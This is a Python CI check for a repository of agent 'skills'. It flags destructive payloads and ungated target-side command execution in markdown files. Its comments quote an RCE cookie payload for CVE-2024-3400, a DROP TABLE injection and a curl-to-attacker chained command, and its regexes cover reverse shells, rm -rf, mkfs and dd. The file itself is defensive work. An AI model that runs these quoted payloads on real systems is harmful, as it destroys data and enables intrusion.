#!/usr/bin/env python3
"""check_destructive_payloads.py — no skill may ship a payload that destroys data
or executes a command on the target without an explicit gate.

A skill is read by an agent that may run what it sees. Two defects shipped before
this gate existed, both in skills aimed at production perimeter appliances:

  * enterprise-vpn-attack sent `SESSID=../../../var/log/pan/test_$(id)_test.txt`
    under the heading "CVE-2024-3400 detection". The cookie value becomes a
    filename, so the substitution ran as root on the firewall and left a file
    behind. Remote command execution, labelled as discovery.
  * hunt-api-misconfig offered `$filter=Name eq 'x'); DROP TABLE Users--'` as the
    illustrative payload for an OData injection, with no warning that running it
    destroys the table.

Both are the same mistake: a payload whose effect is irreversible, presented
where an agent reads instructions rather than warnings.

Two rules:

  1. DESTRUCTIVE payloads are banned outright. DROP/TRUNCATE TABLE, DELETE FROM,
     UPDATE..SET, rm -rf /, mkfs, dd to a device. A read-only differential proves
     the same bug, so there is no case for shipping these.
  2. TARGET-SIDE EXECUTION payloads need a gate within GATE_WINDOW lines above:
     "Stage B", "sign-off", or an explicit prohibition. Command substitution in
     the tester's *own* shell (`code=$(curl ...)`) is normal and not flagged --
     only substitution inside a value being sent to the target counts.

Exit 0 = clean, 1 = at least one ungated payload. Stdlib only.

Usage:
    python3 scripts/check_destructive_payloads.py [skills/foo ...]
"""
import os
import re
import sys

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SKILLS_DIR = os.path.join(REPO, "skills")

# How far above a payload we look for its gate. Generous: a gate in the prose
# introducing a fenced block is the house style, and blocks run long.
GATE_WINDOW = 14

# Rule 1: irreversible. No gate makes these acceptable in a skill.
DESTRUCTIVE = [
    ("DROP TABLE/DATABASE", re.compile(r"\bDROP\s+(?:TABLE|DATABASE)\b", re.I)),
    ("TRUNCATE TABLE", re.compile(r"\bTRUNCATE\s+TABLE\b", re.I)),
    ("DELETE FROM", re.compile(r"\bDELETE\s+FROM\b", re.I)),
    ("UPDATE ... SET", re.compile(r"\bUPDATE\s+[`\"\[\]\w.]+\s+SET\b", re.I)),
    ("rm -rf on an absolute path", re.compile(r"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/")),
    ("mkfs", re.compile(r"\bmkfs(\.\w+)?\b")),
    ("dd to a device", re.compile(r"\bdd\s+if=\S+\s+of=/dev/")),
]

# Rule 2: command execution ON THE TARGET. The distinguishing feature is that the
# substitution sits inside a value the request carries -- a query string, a header,
# a cookie, a body, or a template expression -- not in the tester's own pipeline.
# A payload that merely *runs* a command is not the problem. `id`, `whoami`,
# `uname`, `sleep` and an echoed canary are the industry-standard benign proofs
# for command injection: they write nothing, persist nothing and read no user
# data, and this repo's own authoring standard names them as the correct proof.
# An RCE skill that could not show `;id` would be useless.
#
# What needs a gate is what the command DOES:
#   * exfiltration  — curl/wget to a host that is not the target
#   * interactive access — a reverse shell
#   * persistence   — substitution inside a filename or path, which writes a file
#   * data read      — cat of a credential store
BENIGN_MARKER = r"(?:id|whoami|hostname|uname|pwd|sleep|echo)"
_EXEC = r"(?:id|whoami|hostname|uname|sleep|cat|curl|wget|nc|bash|sh|python\d?)"
_SUBST = r"(?:\$\(" + _EXEC + r"[^)]*\)|`" + _EXEC + r"[^`]*`)"
# Flags and header names that mean "this string is sent to the target". Command
# substitution anywhere inside such a value executes on the target, not here.
_SENT = (r"(?:-H\b|--header\b|-d\b|--data(?:-raw|-binary|-urlencode)?\b|"
         r"-b\b|--cookie\b|-F\b|--form\b|Cookie:|Authorization:|User-Agent:|"
         r"Referer:|X-[\w-]+:|SESSID=|sessionid=)")
TARGET_EXEC = [
    # The case that shipped: $(id) inside a log path, so the appliance writes a
    # file named after the output. The command is benign; the file it leaves is
    # not, and it is indistinguishable from a real intrusion in the target's logs.
    # Anchored on a FILE EXTENSION, not on a path separator. An earlier version
    # keyed on "slashes before the substitution", which matched the `//` in
    # `http://$(id).collab-host/` and flagged every out-of-band DNS callback --
    # the standard, benign blind-RCE confirmation -- as a file write.
    ("command substitution inside a filename (writes a file on the target)",
     re.compile(_SUBST + r"[\w.@%-]*\.(?:txt|log|php|jsp|asp[x]?|sh|json|xml|conf)\b"
                r"|[\w.@%-]*" + _SUBST + r"[\w.@%-]*\.(?:txt|log|php|jsp|asp[x]?)\b")),
    # Interactive access. No benign reading of these.
    ("reverse shell", re.compile(r"\bnc\s+(?:-\w+\s+)*-e\s|/dev/tcp/|"
                                 r"\b(?:ba)?sh\s+-i\s*>&")),
]

# Shell redirection writing a file on the target. Missed by the rules above,
# which key on command substitution inside a filename; `id > /tmp/pwned` has no
# substitution at all, and it shipped in hunt-deserialization Phase 1 as the
# ysoserial payload. The command is a benign marker but the redirect leaves an
# artefact on the target's disk, which is the same defect as the Palo Alto case.
# `>&` is excluded: that is a file-descriptor dup, caught as a reverse shell.
REDIRECT_WRITE = re.compile(
    r"(?<!>)>>?\s*(?!&)(?:/(?:tmp|var|dev/shm|home|root|srv|opt|usr|etc)/|"
    r"[\w.~-]*/?[\w.~-]+\.(?:php|jsp|asp[x]?|sh|txt|log|jar|war))")

# Deliberately NOT checked here, because two attempts produced far more noise
# than signal and a gate contributors learn to ignore is worse than no gate:
#
#   * exfiltration (`;curl https://attacker/?d=...`). Every markdown inline-code
#     span holding a plain `curl` probe matched, because a markdown table pipe is
#     indistinguishable from a shell pipe and a closing backtick from a payload
#     delimiter. 80 findings, nearly all false.
#   * reads of a credential store, for the same reason.
#
# Both remain real review items; they are caught by reading, which is how the two
# defects that motivated this script were actually found. If you want them gated,
# the fix is a markdown parser that knows which spans are code and which are
# prose, not another regex. Until then this script's claim is narrow and true:
# it catches irreversible data loss, a write to the target's filesystem, and a
# reverse shell.

# Shell chaining is only a payload when it sits INSIDE a quoted string literal.
# `curl ... | python3 -m json.tool` pipes in the tester's own shell and is normal;
# `--title 'x"; curl https://attacker/'` ships a command to the target. At the
# regex level those two look alike, so the literals are extracted first and the
# chain is matched only within them. Benign markers are excluded: `;id` is the
# correct proof for command injection, not a defect.
CHAIN_IN_LITERAL = re.compile(
    r"[;&]\s*(?!" + BENIGN_MARKER + r"\b)(?:nc|bash|sh)\s+-")
STRING_LITERAL = re.compile(r"'([^'\n]*)'|\"([^\"\n]*)\"")


def string_literals(line):
    """Yield the contents of each single- or double-quoted literal on the line."""
    for m in STRING_LITERAL.finditer(line):
        yield m.group(1) if m.group(1) is not None else m.group(2)

# A payload is gated when the surrounding prose says so. Matching the repo's own
# vocabulary rather than inventing new markers.
GATE = re.compile(
    r"Stage\s*B|sign-?off|signed\s+authoris|signed\s+authoriz|"
    r"never\s+(?:run|send|use|do)|do\s+not\s+(?:run|send|use)|"
    r"must\s+not|banned|forbidden|destructive|irreversible|"
    r"DANGER|WARNING|only\s+with\s+explicit",
    re.I,
)

# Lines that are documenting a defect rather than instructing one. The fix for a
# vulnerability class and the citation of a historical CVE both legitimately name
# the destructive form.
DOCUMENTING = re.compile(
    r"Sanitiz|Sanitis|\bfix\b|mitigat|defen[cs]|prevent|CVE-\d{4}|"
    r"was\s+used|previously\s+shipped|used\s+to\s+be|remediat|patch",
    re.I,
)


def markdown_files(root):
    for dirpath, _dirs, files in os.walk(root):
        for fn in sorted(files):
            if fn.endswith(".md"):
                yield os.path.join(dirpath, fn)


def scan(path):
    """Return a list of (lineno, severity, label, text) findings for one file."""
    with open(path, encoding="utf-8") as fh:
        lines = fh.read().splitlines()

    out = []
    for idx, line in enumerate(lines):
        window = "\n".join(lines[max(0, idx - GATE_WINDOW): idx + 2])

        for label, pat in DESTRUCTIVE:
            if not pat.search(line):
                continue
            # Naming the destructive form to ban or to cite it is correct.
            if DOCUMENTING.search(line) or GATE.search(line):
                continue
            if GATE.search(window):
                continue
            out.append((idx + 1, "ERROR", f"destructive payload ({label})", line.strip()))

        if DOCUMENTING.search(line) or GATE.search(window):
            continue

        for label, pat in TARGET_EXEC:
            if pat.search(line):
                out.append((idx + 1, "ERROR",
                            f"ungated target-side execution ({label})", line.strip()))
                break
        else:
            for lit in string_literals(line):
                if CHAIN_IN_LITERAL.search(lit):
                    out.append((idx + 1, "ERROR",
                                "ungated target-side execution (command chained inside "
                                "a quoted payload)", line.strip()))
                    break
                # A redirect only writes on the target when it is inside the
                # payload. `curl ... > /tmp/body.txt` redirects on the tester's
                # own machine, which is normal evidence collection.
                if REDIRECT_WRITE.search(lit):
                    out.append((idx + 1, "ERROR",
                                "ungated target-side execution (payload redirects "
                                "output to a file on the target)", line.strip()))
                    break
    return out


def main(argv):
    if any(a in ("-h", "--help") for a in argv[1:]):
        print(__doc__)
        return 0
    targets = argv[1:] or [SKILLS_DIR]
    gha = os.environ.get("GITHUB_ACTIONS")
    total = scanned = 0

    for target in targets:
        if not os.path.exists(target):
            print(f"ERROR no such path: {target}")
            return 1
        for path in markdown_files(target) if os.path.isdir(target) else [target]:
            scanned += 1
            rel = os.path.relpath(path, REPO)
            for lineno, sev, label, text in scan(path):
                total += 1
                msg = (f"{rel}:{lineno}: {label} with no Stage B / sign-off / "
                       f"prohibition within {GATE_WINDOW} lines above\n"
                       f"    {text[:110]}")
                print(f"::error file={rel},line={lineno}:: {msg}" if gha
                      else f"{sev} {msg}")

    print(f"\ncheck_destructive_payloads: {scanned} file(s), {total} ungated payload(s).")
    if total:
        print("A read-only differential proves the same bug. If an impact demo is "
              "genuinely required, gate it: Stage B + explicit written sign-off.")
    return 1 if total else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
